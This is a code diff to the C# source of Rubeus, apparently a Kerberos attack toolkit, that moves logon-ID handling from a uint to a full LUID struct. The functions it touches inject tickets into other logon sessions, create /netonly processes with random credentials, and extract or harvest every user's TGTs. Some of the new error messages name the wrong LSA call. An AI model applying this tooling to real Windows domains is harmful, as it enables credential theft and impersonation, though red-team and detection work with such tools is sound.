@@ -32,10 +32,11 @@ namespace Rubeus
             return lsaHandle;
         }
 
-        public static uint CreateProcessNetOnly(string commandLine, bool show = false)
+        public static Interop.LUID CreateProcessNetOnly(string commandLine, bool show = false)
         {
             // creates a hidden process with random /netonly credentials,
             //  displayng the process ID and LUID, and returning the LUID
+
             // Note: the LUID can be used with the "ptt" action
 
             Console.WriteLine("\r\n[*] Action: Create Process (/netonly)\r\n");
@@ -50,14 +51,14 @@ namespace Rubeus
                 si.dwFlags = 0x00000001;
             }
             Console.WriteLine("[*] Showing process : {0}", show);
-            uint luid = 0;
+            Interop.LUID luid = new Interop.LUID();
 
             // 0x00000002 == LOGON_NETCREDENTIALS_ONLY
             if (!Interop.CreateProcessWithLogonW(Helpers.RandomString(8), Helpers.RandomString(8), Helpers.RandomString(8), 0x00000002, commandLine, String.Empty, 0, 0, null, ref si, out pi))
             {
                 uint lastError = Interop.GetLastError();
                 Console.WriteLine("[X] CreateProcessWithLogonW error: {0}", lastError);
-                return 0;
+                return new Interop.LUID();
             }
 
             Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
@@ -70,7 +71,7 @@ namespace Rubeus
             {
                 uint lastError = Interop.GetLastError();
                 Console.WriteLine("[X] OpenProcessToken error: {0}", lastError);
-                return 0;
+                return new Interop.LUID();
             }
 
             int TokenInfLength = 0;
@@ -87,9 +88,16 @@ namespace Rubeus
             if (Result)
             {
                 Interop.TOKEN_STATISTICS TokenStats = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS));
-                Interop.LUID authId = TokenStats.AuthenticationId;
-                Console.WriteLine("[+] LUID            : {0}", authId.LowPart);
-                luid = authId.LowPart;
+                luid = new Interop.LUID(TokenStats.AuthenticationId);
+                Console.WriteLine("[+] LUID            : {0}", luid);
+            }
+            else
+            {
+                uint lastError = Interop.GetLastError();
+                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
+                Marshal.FreeHGlobal(TokenInformation);
+                Interop.CloseHandle(hToken);
+                return new Interop.LUID();
             }
 
             Marshal.FreeHGlobal(TokenInformation);
@@ -98,7 +106,7 @@ namespace Rubeus
             return luid;
         }
 
-        public static void ImportTicket(byte[] ticket, uint targetLuid = 0)
+        public static void ImportTicket(byte[] ticket, Interop.LUID targetLuid)
         {
             Console.WriteLine("\r\n[*] Action: Import Ticket");
 
@@ -109,7 +117,7 @@ namespace Rubeus
             int AuthenticationPackage;
             int ntstatus, ProtocalStatus;
 
-            if(targetLuid != 0)
+            if((ulong)targetLuid != 0)
             {
                 if(!Helpers.IsHighIntegrity())
                 {
@@ -155,7 +163,8 @@ namespace Rubeus
                 if (ntstatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
-                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
                 Interop.KERB_SUBMIT_TKT_REQUEST request = new Interop.KERB_SUBMIT_TKT_REQUEST();
@@ -163,13 +172,10 @@ namespace Rubeus
                 request.KerbCredSize = ticket.Length;
                 request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));
 
-                if(targetLuid != 0)
+                if((ulong)targetLuid != 0)
                 {
-                    Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
-                    Interop.LUID luid = new Interop.LUID();
-                    luid.LowPart = targetLuid;
-                    luid.HighPart = 0;
-                    request.LogonId = luid;
+                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
+                    request.LogonId = targetLuid;
                 }
 
                 int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
@@ -180,13 +186,15 @@ namespace Rubeus
                 if (ntstatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
-                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
                 if (ProtocalStatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
-                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
                     return;
                 }
                 Console.WriteLine("[+] Ticket successfully imported!");
@@ -199,7 +207,7 @@ namespace Rubeus
             }
         }
 
-        public static void Purge(uint targetLuid = 0)
+        public static void Purge(Interop.LUID targetLuid)
         {
             Console.WriteLine("\r\n[*] Action: Purge Tickets");
 
@@ -210,7 +218,7 @@ namespace Rubeus
             int AuthenticationPackage;
             int ntstatus, ProtocalStatus;
 
-            if (targetLuid != 0)
+            if ((ulong)targetLuid != 0)
             {
                 if (!Helpers.IsHighIntegrity())
                 {
@@ -256,31 +264,19 @@ namespace Rubeus
                 if (ntstatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
-                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
 
                 Interop.KERB_PURGE_TKT_CACHE_REQUEST request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                 request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;
 
-                if (targetLuid != 0)
+                if ((ulong)targetLuid != 0)
                 {
-                    Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
-                    Interop.LUID luid = new Interop.LUID();
-                    luid.LowPart = targetLuid;
-                    luid.HighPart = 0;
-                    request.LogonId = luid;
+                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
+                    request.LogonId = targetLuid;
                 }
-
-                //Interop.LSA_STRING_IN ServerName;
-                //ServerName.Length = 0;
-                //ServerName.MaximumLength = 0;
-                //ServerName.Buffer = null;
-
-                //Interop.LSA_STRING_IN RealmName;
-                //ServerName.Length = 0;
-                //ServerName.MaximumLength = 0;
-                //ServerName.Buffer = null;
 
                 int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));
                 inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
@@ -289,13 +285,15 @@ namespace Rubeus
                 if (ntstatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
-                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
                 if (ProtocalStatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
-                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                     return;
                 }
                 Console.WriteLine("[+] Tickets successfully purged!");
@@ -308,7 +306,7 @@ namespace Rubeus
             }
         }
 
-        public static void ListKerberosTicketData(uint targetLuid = 0, string targetService = "", bool monitor = false, string registryBasePath = null)
+        public static void ListKerberosTicketData(Interop.LUID targetLuid, string targetService = "", bool monitor = false, string registryBasePath = null)
         {
             if (Helpers.IsHighIntegrity())
             {
@@ -324,7 +322,7 @@ namespace Rubeus
             }
         }
 
-        public static void ListKerberosTickets(uint targetLuid = 0)
+        public static void ListKerberosTickets(Interop.LUID targetLuid)
         {
             if (Helpers.IsHighIntegrity())
             {
@@ -336,7 +334,7 @@ namespace Rubeus
             }
         }
 
-        public static void ListKerberosTicketDataAllUsers(uint targetLuid = 0, string targetService = "", bool monitor = false, bool harvest = false, string registryBasePath = null)
+        public static void ListKerberosTicketDataAllUsers(Interop.LUID targetLuid, string targetService = "", bool monitor = false, bool harvest = false, string registryBasePath = null)
         {
             // extracts Kerberos ticket data for all users on the system (assuming elevation)
 
@@ -391,9 +389,9 @@ namespace Rubeus
                 }
             }
 
-            if (targetLuid != 0)
+            if ((ulong)targetLuid != 0)
             {
-                Console.WriteLine("[*] Target LUID     : 0x{0:x}", targetLuid);
+                Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
             }
             if (!String.IsNullOrEmpty(targetService))
             {
@@ -481,12 +479,10 @@ namespace Rubeus
                         Interop.KERB_TICKET_CACHE_INFO ticket;
 
                         // input object for querying the ticket cache for a specific logon ID
-                        Interop.LUID userLogonID = new Interop.LUID();
-                        userLogonID.LowPart = data.LoginID.LowPart;
-                        userLogonID.HighPart = 0;
+                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                         tQuery.LogonId = userLogonID;
 
-                        if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid))
+                        if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                         {
                             tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;
 
@@ -784,7 +780,7 @@ namespace Rubeus
             }
         }
 
-        public static void ListKerberosTicketsAllUsers(uint targetLuid = 0)
+        public static void ListKerberosTicketsAllUsers(Interop.LUID targetLuid)
         {
             // lists Kerberos tickets for all users on the system (assuming elevation)
 
@@ -798,9 +794,9 @@ namespace Rubeus
 
             Console.WriteLine("\r\n\r\n[*] Action: List Kerberos Tickets (All Users)\r\n");
 
-            if (targetLuid != 0)
+            if ((ulong)targetLuid != 0)
             {
-                Console.WriteLine("[*] Target LUID     : 0x{0:x}", targetLuid);
+                Console.WriteLine("[*] Target LUID     : 0x{0:x}", (ulong)targetLuid);
             }
 
             int retCode;
@@ -878,12 +874,10 @@ namespace Rubeus
                         Interop.KERB_TICKET_CACHE_INFO_EX ticket;
 
                         // input object for querying the ticket cache for a specific logon ID
-                        Interop.LUID userLogonID = new Interop.LUID();
-                        userLogonID.LowPart = data.LoginID.LowPart;
-                        userLogonID.HighPart = 0;
+                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                         tQuery.LogonId = userLogonID;
 
-                        if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid))
+                        if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                         {
                             tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;
 
@@ -1324,7 +1318,7 @@ namespace Rubeus
             Interop.LsaDeregisterLogonProcess(lsaHandle);
         }
 
-        public static List<KRB_CRED> ExtractTGTs(uint targetLuid = 0, bool includeComputerAccounts = false)
+        public static List<KRB_CRED> ExtractTGTs(Interop.LUID targetLuid, bool includeComputerAccounts = false)
         {
             // extracts Kerberos TGTs for all users on the system (assuming elevation) or for a specific logon ID (luid)
 
@@ -1421,12 +1415,10 @@ namespace Rubeus
                             Interop.KERB_TICKET_CACHE_INFO ticket;
 
                             // input object for querying the ticket cache for a specific logon ID
-                            Interop.LUID userLogonID = new Interop.LUID();
-                            userLogonID.LowPart = data.LoginID.LowPart;
-                            userLogonID.HighPart = 0;
+                            Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                             tQuery.LogonId = userLogonID;
 
-                            if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid))
+                            if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                             {
                                 tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;
 
@@ -1974,9 +1966,6 @@ namespace Rubeus
                 }
                 // cleanup 1
                 Interop.DeleteSecurityContext(ref ClientContext);
-
-                // cleanup 2
-                //Interop.FreeContextBuffer(ref ClientToken.pBuffers);
             }
             else
             {
